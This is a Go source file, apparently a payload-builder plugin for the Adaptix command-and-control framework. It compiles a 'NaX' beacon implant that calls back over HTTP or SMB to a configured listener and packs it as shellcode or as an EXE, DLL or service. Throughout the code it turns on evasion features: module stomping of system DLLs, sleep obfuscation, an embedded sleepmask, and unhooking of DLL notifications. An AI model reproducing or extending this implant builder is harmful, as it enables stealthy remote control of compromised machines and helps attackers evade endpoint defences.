package main

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"

	adaptix "github.com/Adaptix-Framework/axc2"
)

func splitHostPort(hp string) (host string, port int, portExplicit bool) {
	idx := strings.LastIndex(hp, ":")
	if idx < 0 {
		return hp, 0, false
	}
	host = hp[:idx]
	p, err := strconv.Atoi(hp[idx+1:])
	if err != nil || p < 1 || p > 65535 {
		return host, 0, false
	}
	return host, p, true
}

func resolveNaxRoot() string {
	confPath := filepath.Join(ModuleDir, "nax_root.conf")
	if data, err := os.ReadFile(confPath); err == nil {
		root := strings.TrimSpace(string(data))
		if root != "" {
			root, _ = filepath.Abs(root)
			return root
		}
	}
	root := filepath.Join(ModuleDir, "..", "..", "..", "NaX")
	root, _ = filepath.Abs(root)
	return root
}

func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	var agentCfg map[string]any
	if err := json.Unmarshal([]byte(profile.AgentConfig), &agentCfg); err != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: agent config: %w", err)
	}

	if len(profile.ListenerProfiles) == 0 {
		return nil, "", errors.New("nonameax: BuildPayload: no listener selected")
	}
	var listenerCfg map[string]any
	if err := json.Unmarshal(profile.ListenerProfiles[0].Profile, &listenerCfg); err != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: listener config: %w", err)
	}

	_, isSMB := listenerCfg["pipename"]

	encKeyHex, _ := listenerCfg["encrypt_key"].(string)
	key, err := hex.DecodeString(encKeyHex)
	if err != nil || len(key) != 16 {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: encrypt_key must be 32 hex chars (got %q)", encKeyHex)
	}

	naxLogInfo("BuildPayload: listener=%v keyHex=%s keyPrefix=%x", profile.ListenerProfiles[0].Watermark, encKeyHex, key[:4])

	wmVal, wmErr := strconv.ParseUint(AgentWatermark, 16, 32)
	if wmErr != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: bad watermark %q", AgentWatermark)
	}
	watermark := uint32(wmVal)

	listenerWmStr := profile.ListenerProfiles[0].Watermark
	lwmVal, lwmErr := strconv.ParseUint(listenerWmStr, 16, 32)
	if lwmErr != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: bad listener watermark %q", listenerWmStr)
	}
	listenerWatermark := uint32(lwmVal)

	naxRoot := resolveNaxRoot()
	makefile := filepath.Join(naxRoot, "Makefile")
	if _, err := os.Stat(makefile); err != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: NaX source not found at %s (set via nax_root.conf or relative fallback)", naxRoot)
	}

	configPath := filepath.Join(naxRoot, "src_beacon", "include", "Config.h")

	var configH []byte
	var profileBytes []byte
	var transportProfile int
	var sleepMs uint32
	var jitterPct uint32

	var gateAPIs []string
	if raw, ok := agentCfg["gate_apis"].([]any); ok {
		for _, item := range raw {
			if s, ok := item.(string); ok && s != "" {
				gateAPIs = append(gateAPIs, s)
			}
		}
	}

	if isSMB {
		pipeName, _ := listenerCfg["pipename"].(string)
		if pipeName == "" {
			pipeName = "naxsmb"
		}
		configH = generateSmbConfigH(pipeName, key, 0, 0, watermark, listenerWatermark, gateAPIs)
		transportProfile = 1
	} else {
		sleepSec := 10
		switch v := agentCfg["sleep"].(type) {
		case float64:
			sleepSec = int(v)
		case string:
			if n, err := strconv.Atoi(v); err == nil {
				sleepSec = n
			}
		}
		if sleepSec < 1 {
			sleepSec = 10
		}
		sleepMs = uint32(sleepSec) * 1000

		switch v := agentCfg["jitter"].(type) {
		case float64:
			jitterPct = uint32(v)
		case string:
			if n, err := strconv.Atoi(v); err == nil {
				jitterPct = uint32(n)
			}
		}
		if jitterPct > 100 {
			jitterPct = 0
		}

		profCfg := parseProfileFromListenerConfig(listenerCfg)
		if len(profCfg.Hosts) == 0 {
			return nil, "", errors.New("nonameax: BuildPayload: no callback hosts in listener profile (set Hosts in the listener config)")
		}
		profileBytes = EncodeProfileBodyV2(profCfg)

		callbackHost, callbackPort, portExplicit := splitHostPort(profCfg.Hosts[0])

		bootURI := "/api/v1/status"
		if len(profCfg.Post.URIs) > 0 {
			bootURI = profCfg.Post.URIs[0]
		}

		listenerSSL, _ := listenerCfg["ssl"].(bool)
		if !portExplicit {
			if listenerSSL {
				callbackPort = 443
			} else {
				callbackPort = 80
			}
		}
		configH = generateConfigH(callbackHost, callbackPort, bootURI, key, sleepMs, jitterPct, profileBytes, watermark, listenerWatermark, gateAPIs, listenerSSL)
		transportProfile = 0
	}

	debug := false
	if v, ok := agentCfg["debug"].(bool); ok {
		debug = v
	} else if v, ok := agentCfg["debug"].(string); ok && v == "true" {
		debug = true
	}

	fullRebuild := false
	if v, ok := agentCfg["full_rebuild"].(bool); ok {
		fullRebuild = v
	}

	moduleStomp := true
	if v, ok := agentCfg["module_stomp"].(bool); ok {
		moduleStomp = v
	}

	stompAdvanced := false
	if v, ok := agentCfg["stomp_advanced"].(string); ok {
		stompAdvanced = strings.ToLower(v) != "basic (loadlibraryex)"
	}

	stompDll := "chakra.dll"
	if v, ok := agentCfg["stomp_dll"].(string); ok && v != "" {
		stompDll = v
	}

	stompUnwind := true
	if v, ok := agentCfg["stomp_unwind"].(bool); ok {
		stompUnwind = v
	}

	useThreadPool := true
	if v, ok := agentCfg["thread_pool"].(bool); ok {
		useThreadPool = v
	}

	beacongate := false
	if v, ok := agentCfg["beacongate"].(bool); ok {
		beacongate = v
	}
	_ = beacongate

	unhookDllNotify := true

	bofStomp := true
	if v, ok := agentCfg["bof_stomp"].(bool); ok {
		bofStomp = v
	}

	bofStompDll := "chakra.dll"
	if v, ok := agentCfg["bof_stomp_dll"].(string); ok && v != "" {
		bofStompDll = v
	}

	bofStompPool := []string{"jscript9.dll", "mshtml.dll", "d3d11.dll"}
	if raw, ok := agentCfg["bof_stomp_pool"].([]any); ok && len(raw) > 0 {
		bofStompPool = nil
		for _, item := range raw {
			if s, ok := item.(string); ok && s != "" {
				bofStompPool = append(bofStompPool, s)
			}
		}
	}

	smStompDll := ""
	if beacongate && bofStomp {
		smStompDll = "msmpeg2vdec.dll"
		if v, ok := agentCfg["sm_stomp_dll"].(string); ok && v != "" {
			smStompDll = v
		}
	}

	sleepObf := "1"
	switch v := agentCfg["sleep_obf"].(type) {
	case string:
		switch strings.ToLower(v) {
		case "off":
			sleepObf = "0"
		default:
			sleepObf = "1"
		}
	case bool:
		if !v {
			sleepObf = "0"
		}
	case float64:
		if int(v) == 0 {
			sleepObf = "0"
		}
	}

	outputFormat := "bin"
	if v, ok := agentCfg["output_format"].(string); ok && v != "" {
		outputFormat = strings.ToLower(v)
	}

	svcName := "NaxService"
	if v, ok := agentCfg["svc_name"].(string); ok && v != "" {
		svcName = v
	}

	dllExport := "Runner"
	if v, ok := agentCfg["dll_export"].(string); ok && v != "" {
		dllExport = v
	}

	buildMu.Lock()
	defer buildMu.Unlock()

	bid := profile.BuilderId

	buildLog := func(status int, msg string, args ...any) {
		m := fmt.Sprintf(msg, args...)
		if Ts != nil && bid != "" {
			_ = Ts.TsAgentBuildLog(bid, status, m)
		}
		switch status {
		case 2:
			naxLogErr("BuildPayload: %s", m)
		case 3:
			naxLogOk("BuildPayload: %s", m)
		default:
			naxLogInfo("BuildPayload: %s", m)
		}
	}

	if isSMB {
		pipeName, _ := listenerCfg["pipename"].(string)
		buildLog(1, "transport=SMB  pipe=%s (async, no sleep)", pipeName)
	} else {
		callbackHost, _ := agentCfg["callback_host"].(string)
		callbackPort := 8080
		if v, ok := agentCfg["callback_port"].(float64); ok {
			callbackPort = int(v)
		}
		buildLog(1, "transport=HTTP  callback=%s:%d  sleep=%dms  jitter=%d%%", callbackHost, callbackPort, sleepMs, jitterPct)
	}
	buildLog(1, "debug=%v  full_rebuild=%v", debug, fullRebuild)
	stompTechLabel := "basic"
	if stompAdvanced {
		stompTechLabel = "advanced"
	}
	buildLog(1, "module_stomp=%v  technique=%s  stomp_dll=%s  stomp_unwind=%v  thread_pool=%v", moduleStomp, stompTechLabel, stompDll, stompUnwind, useThreadPool)
	buildLog(1, "bof_stomp=%v  bof_sync_dll=%s  bof_async_pool=%v  sm_stomp_dll=%s", bofStomp, bofStompDll, bofStompPool, smStompDll)
	buildLog(1, "unhook_dll_notify=%v", unhookDllNotify)
	sleepObfName := map[string]string{"0": "disabled", "1": "enabled"}[sleepObf]
	buildLog(1, "sleep_obf=%s (%s)", sleepObf, sleepObfName)

	// Append sleep obfuscation defaults to Config.h (must live here so
	// the link-only path recompiles Config.c with the correct values).
	{
		var obfBuf bytes.Buffer
		obfBuf.Write(configH)
		fmt.Fprintf(&obfBuf, "\n/* ---- sleep obfuscation defaults ---- */\n")
		fmt.Fprintf(&obfBuf, "#define NAX_DEFAULT_SLEEP_OBF   %s\n", sleepObf)
		configH = obfBuf.Bytes()
	}

	{
		var bofBuf bytes.Buffer
		bofBuf.Write(configH)
		generateBofStompConfig(&bofBuf, bofStomp, bofStompDll, bofStompPool, smStompDll)
		if unhookDllNotify {
			bofBuf.WriteString("\n/* ---- DLL notification unhooking ---- */\n")
			bofBuf.WriteString("#define NAX_UNHOOK_DLL_NOTIFY 1\n")
		} else {
			bofBuf.WriteString("\n#define NAX_UNHOOK_DLL_NOTIFY 0\n")
		}
		configH = bofBuf.Bytes()
	}

	/* ========= [ build sleepmask BOF (if beacongate) ] ========= */
	var sleepmaskBytes []byte
	if beacongate {
		smTarget := "all"
		if debug {
			smTarget = "debug"
		}
		smArgs := []string{"-C", filepath.Join(naxRoot, "src_sleepmask"), smTarget}
		buildLog(1, "Building sleepmask BOF")
		smCmd := exec.Command("make", smArgs...)
		smOut, smErr := smCmd.CombinedOutput()
		if smErr != nil {
			buildLog(2, "Sleepmask build failed: %v\n%s", smErr, string(smOut))
		} else {
			smPath := filepath.Join(naxRoot, "src_sleepmask", "dist", "sleepmask.x64.o")
			if smBytes, err := os.ReadFile(smPath); err == nil && len(smBytes) > 0 {
				sleepmaskBytes = smBytes
				sleepmaskBofCache = smBytes
				buildLog(1, "Sleepmask BOF: %d bytes (embedded + cached)", len(smBytes))
			} else {
				buildLog(2, "Sleepmask BOF not found at %s", smPath)
			}
		}
	}

	if len(sleepmaskBytes) > 0 {
		var smBuf bytes.Buffer
		smBuf.Write(configH)
		fmt.Fprintf(&smBuf, "\n/* ---- embedded sleepmask BOF ---- */\n")
		fmt.Fprintf(&smBuf, "#define NAX_SLEEPMASK_LEN  %du\n", len(sleepmaskBytes))
		smBuf.WriteString("#include \"Config_sleepmask.h\"\n")
		configH = smBuf.Bytes()
	}

	buildLog(1, "Generating Config.h (%d bytes)", len(configH))
	if err := writeIfChanged(configPath, configH); err != nil {
		buildLog(2, "Failed to write Config.h: %v", err)
		return nil, "", fmt.Errorf("nonameax: BuildPayload: write Config.h: %w", err)
	}
	if len(profileBytes) > 0 {
		buildLog(1, "profile v2: %d bytes embedded", len(profileBytes))
		profilePath := filepath.Join(naxRoot, "src_beacon", "include", "Config_profile.h")
		profileH := generateProfileH(profileBytes)
		if err := writeIfChanged(profilePath, profileH); err != nil {
			buildLog(2, "Failed to write Config_profile.h: %v", err)
			return nil, "", fmt.Errorf("nonameax: BuildPayload: write Config_profile.h: %w", err)
		}
	}
	if len(sleepmaskBytes) > 0 {
		smHdrPath := filepath.Join(naxRoot, "src_beacon", "include", "Config_sleepmask.h")
		smH := generateSleepmaskH(sleepmaskBytes)
		if err := writeIfChanged(smHdrPath, smH); err != nil {
			buildLog(2, "Failed to write Config_sleepmask.h: %v", err)
			return nil, "", fmt.Errorf("nonameax: BuildPayload: write Config_sleepmask.h: %w", err)
		}
	}

	transportSubdir := "http"
	if transportProfile == 1 {
		transportSubdir = "smb"
	}
	buildDir := filepath.Join(naxRoot, "src_beacon", "build", transportSubdir)

	if fullRebuild {
		buildLog(1, "Cleaning previous build artifacts...")
		os.RemoveAll(buildDir)
		os.MkdirAll(buildDir, 0755)
	} else {
		buildLog(1, "Link-only build (Config.c + re-link)")
	}

	configObj := filepath.Join(buildDir, "Config.obj")
	if debug {
		configObj = filepath.Join(buildDir, "Config.dpic.obj")
	}
	firstBuild := false
	if _, err := os.Stat(configObj); os.IsNotExist(err) {
		firstBuild = true
	}

	var target string
	if fullRebuild || firstBuild {
		if firstBuild {
			buildLog(1, "First build detected - full compilation required")
		}
		if debug {
			target = "debug-components"
		} else {
			target = "components"
		}
	} else {
		if debug {
			target = "debug-link-components"
		} else {
			target = "link-components"
		}
	}

	stompMode := "1"
	if !moduleStomp {
		stompMode = "0"
	}
	stompAdv := "0"
	if stompAdvanced && moduleStomp {
		stompAdv = "1"
	}
	execMode := "1"
	if !useThreadPool {
		execMode = "0"
	}

	// Only rebuild loader when technique defines change - compare against
	// a sentinel file. Otherwise reuse cached .o files for fast re-link.
	// Transport profile is NOT included — the loader doesn't use it.
	loaderObjDir := filepath.Join(naxRoot, "src_loader", "bin", "obj")
	sentinel := filepath.Join(loaderObjDir, ".nax_defines")
	currentDefines := stompMode + ":" + execMode + ":" + stompAdv
	if prev, err := os.ReadFile(sentinel); err != nil || strings.TrimSpace(string(prev)) != currentDefines {
		buildLog(1, "Loader defines changed - rebuilding")
		os.RemoveAll(loaderObjDir)
		os.MkdirAll(loaderObjDir, 0755)
		os.WriteFile(sentinel, []byte(currentDefines), 0644)
	}

	makeArgs := []string{"-C", naxRoot, target,
		"NAX_STOMP_MODE=" + stompMode,
		"NAX_EXEC_MODE=" + execMode,
		"NAX_STOMP_ADVANCED=" + stompAdv,
		"NAX_TRANSPORT_PROFILE=" + strconv.Itoa(transportProfile),
	}
	buildLog(1, "Compiling: make %s", strings.Join(makeArgs[1:], " "))
	buildCmd := exec.Command("make", makeArgs...)
	buildOut, buildErr := buildCmd.CombinedOutput()
	for _, line := range strings.Split(string(buildOut), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.Contains(line, "section below image base") ||
			strings.HasPrefix(line, "BIN ") ||
			strings.HasPrefix(line, "DEBUG ") ||
			strings.HasPrefix(line, "loader ") ||
			strings.HasPrefix(line, "hdr ") ||
			strings.HasPrefix(line, "beacon ") {
			continue
		}
		if strings.HasPrefix(line, "[+]") || strings.Contains(line, "done") || strings.Contains(line, "ready") {
			buildLog(3, "%s", strings.TrimPrefix(line, "[+] "))
		} else if strings.HasPrefix(line, "[-]") || strings.HasPrefix(line, "Error") {
			buildLog(2, "%s", strings.TrimPrefix(line, "[-] "))
		} else if strings.HasPrefix(line, "[*]") {
			buildLog(1, "%s", strings.TrimPrefix(line, "[*] "))
		} else {
			buildLog(0, "%s", line)
		}
	}
	if buildErr != nil {
		buildLog(2, "Build failed: %v", buildErr)
		return nil, "", fmt.Errorf("nonameax: BuildPayload: make %s failed: %v", target, buildErr)
	}

	/* ========= [ read component binaries ] ========= */
	loaderPath := filepath.Join(naxRoot, "src_loader", "bin", "nax_loader.x64.bin")
	var beaconPath, pdataPath, xdataPath, rvaPath string
	if debug {
		beaconPath = filepath.Join(buildDir, "beacon.x64.debug.bin")
		pdataPath = filepath.Join(buildDir, "beacon.debug.pdata.bin")
		xdataPath = filepath.Join(buildDir, "beacon.debug.xdata.bin")
		rvaPath = filepath.Join(buildDir, "beacon.debug.text_rva")
	} else {
		beaconPath = filepath.Join(buildDir, "beacon.x64.bin")
		pdataPath = filepath.Join(buildDir, "beacon.pdata.bin")
		xdataPath = filepath.Join(buildDir, "beacon.xdata.bin")
		rvaPath = filepath.Join(buildDir, "beacon.text_rva")
	}

	loader, err := os.ReadFile(loaderPath)
	if err != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: read loader: %w", err)
	}
	beacon, err := os.ReadFile(beaconPath)
	if err != nil {
		return nil, "", fmt.Errorf("nonameax: BuildPayload: read beacon: %w", err)
	}

	var pdata, xdata []byte
	var textRva uint32
	var flags uint32

	if moduleStomp {
		flags |= flagModStomp
		if stompUnwind {
			flags |= flagStompPdat
			pdata, _ = os.ReadFile(pdataPath)
			xdata, _ = os.ReadFile(xdataPath)
			textRva, _ = readTextRVA(rvaPath)
		}
	}

	/* ========= [ pack payload in Go (always v2) ] ========= */
	buildLog(1, "Packing v2: loader=%d beacon=%d pdata=%d xdata=%d flags=0x%04x dll=%s",
		len(loader), len(beacon), len(pdata), len(xdata), flags, stompDll)
	payload := packNaxBin(loader, beacon, pdata, xdata, textRva, flags, stompDll)

	binName := "nax.x64.bin"
	if debug {
		binName = "nax.x64.debug.bin"
	}

	buildLog(3, "%s packed successfully (%d bytes)", binName, len(payload))

	/* ========= [ PE wrapper (exe/dll/svc) ] ========= */
	if outputFormat != "bin" {
		buildLog(1, "Wrapping PIC in PE format: %s", outputFormat)
		wrapped, peFilename, err := compileWrapper(payload, outputFormat, svcName, dllExport, debug, buildLog)
		if err != nil {
			buildLog(2, "PE wrapper failed: %v", err)
			return nil, "", fmt.Errorf("nonameax: PE wrapper: %w", err)
		}
		payload = wrapped
		binName = peFilename
	}

	return payload, binName, nil
}
